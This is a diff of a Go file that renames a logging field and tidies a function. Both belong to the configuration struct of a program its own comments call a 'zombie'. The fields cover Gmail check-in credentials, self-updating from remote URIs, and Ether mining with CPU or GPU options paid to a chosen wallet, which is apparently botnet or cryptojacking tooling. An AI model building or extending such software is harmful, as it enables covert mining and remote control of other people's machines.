@@ -20,7 +20,7 @@ type Config struct {
 	UpdateFrequencySeconds      int           `json:"UpdateFrequencySeconds"`      // (R) The frequency with which this program will attempt to update itself. In seconds.
 	RemoteUpdateURI             string        `json:"RemoteUpdateURI"`             // (R) The remote location where new source code can be obtained from for this program.
 	RemoteVersionURI            string        `json:"RemoteVersionURI"`            // (R) The remote URI where the latest version number of this program can be obtained from.
-	LoggingVolatility           int           `json:"LoggingVolatility"`           // (R) How quickly or slowly logs are pruned from the local disk. More volatility means logs last less time. Use 0 for most conservative logging strategy, 3 for least conservative.
+	LogVolatility               int           `json:"LogVolatility"`               // (R) How quickly or slowly logs are pruned from the local disk. More volatility means logs last less time. Use 0 for most conservative logging strategy, 3 for least conservative.
 	EtherWallet                 string        `json:"EtherWallet"`                 // (O) The wallet address of whatever Ethereum wallet you want your mining contributions to go to.
 	MineEther                   bool          `json:"MineEther"`                   // (O) Whether or not this zombie should mine ether.
 	GPUMine                     bool          `json:"GPUMine"`                     // (O) If this zombie is mining ether, should it GPU mine?
@@ -38,13 +38,13 @@ type Config struct {
 }
 
 func ConfigJSONParametersExplained() string {
-	s := `
+	return `
 	CheckInGmailCredentialsFile string        json:"CheckInGmailCredentialsFile" // (R) The email address where this program will report regular status updates to
 	CheckInFrequencySeconds     time.Duration json:"CheckInFrequencySeconds"     // (R) The frequency with which this program will send status updates. In seconds.
 	UpdateFrequencySeconds      int           json:"UpdateFrequencySeconds"      // (R) The frequency with which this program will attempt to update itself. In seconds.
 	RemoteUpdateURI             string        json:"RemoteUpdateURI"             // (R) The remote location where new source code can be obtained from for this program.
 	RemoteVersionURI            string        json:"RemoteVersionURI"            // (R) The remote URI where the latest version number of this program can be obtained from.
-	LoggingVolatility           int           json:"LoggingVolatility"           // (R) How quickly or slowly logs are pruned from the local disk. More volatility means logs last less time. Use 0 for most conservative logging strategy, 3 for least conservative.
+	LogVolatility               int           json:"LogVolatility"               // (R) How quickly or slowly logs are pruned from the local disk. More volatility means logs last less time. Use 0 for most conservative logging strategy, 3 for least conservative.
 	EtherWallet                 string        json:"EtherWallet"                 // (O) The wallet address of whatever Ethereum wallet you want your mining contributions to go to.
 	MineEther                   bool          json:"MineEther"                   // (O) Whether or not this zombie should mine ether.
 	GPUMine                     bool          json:"GPUMine"                     // (O) If this zombie is mining ether, should it GPU mine?
@@ -60,7 +60,6 @@ func ConfigJSONParametersExplained() string {
 	CheckInGmailAddress  string // (O) the gmail address to send updates to and receive updates from. parsed from line 1 of CheckInEmailCredentialsFile
 	CheckInGmailPassword string // (O) the password for the gmail account. parsed from line 2 of CheckInEmailCredentialsFile
 `
-	return s
 }
 
 // ConfigFromFile will generate a config struct from the local standard config
